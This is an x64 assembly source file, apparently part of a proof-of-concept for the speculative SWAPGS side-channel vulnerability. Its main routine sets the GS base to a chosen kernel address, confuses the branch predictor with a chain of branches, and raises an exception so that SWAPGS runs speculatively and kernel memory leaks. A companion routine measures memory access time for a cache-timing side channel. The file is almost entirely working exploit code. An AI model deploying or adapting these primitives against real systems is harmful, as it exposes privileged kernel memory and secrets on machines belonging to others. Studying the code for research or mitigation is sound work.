; SPDX-License-Identifier: BSD-3-Clause

    .code


;
; unsigned void AsmSpeculateSwapgs(PBYTE TargetKernelVa, PBYTE RandomBranches)
;       Modifies the GS base, confuses the branch predictors & generates an exception in order to trigger specluative
;       SWAPGS to be executed in kernel, which leads to arbitrary memory access (specilatively)
;       Parameters:
;           TargetKernelVa - Target Kernel VA to be leaked (- 0x188)
;           RandomBranches - A long chain of conditional branches, sued to confuse the branch predictors
;       Returns:
;           Zero
;
AsmSpeculateSwapgs proc
    ; Write the kernel target VA (- 0x188) into GS base
    wrgsbase    rcx

    xor         eax, eax

    ; Long chain of conditional branches, which *should* confuse the branch predictors by the time we get to the
    ; SWAPGS gadget.
    call        rdx

    ; Any kind of exception can be generated. One can even wait patiently for an interrupt to take place.
    ud2

    ret
AsmSpeculateSwapgs endp



;
; unsigned long long AsmTestAccessTime(PBYTE Address)
;       Returns the number of CPU clocks it took to access Address.
;       Parameters:
;           Address - memory region to be accessed
;       Returns:
;           The number of CPU clocks the access took.
;
AsmTestAccessTime proc
    rdtsc
    shl     rdx, 32
    or      rdx, rax
    mov     r8, rdx

    lfence
    mov     al, [rcx]
    lfence

    rdtsc
    shl     rdx, 32
    or      rax, rdx
    sub     rax, r8

    ret
AsmTestAccessTime endp



;
; unsinged long long AsmRdrand(void)
;       Returns:
;           A random value
;
AsmRdrand proc
    rdrand  rax
    ret
AsmRdrand endp



;
; unsinged long long AsmRdgsbase(void)
;       Returns:
;           The current value of the GS base.
;
AsmRdgsbase proc
    rdgsbase rax
    ret
AsmRdgsbase endp



;
; unsinged void AsmWrgsbase(unsigned long long value)
;       Returns:
;           Nothing
;
AsmWrgsbase proc
    wrgsbase rcx
    ret
AsmWrgsbase endp


end
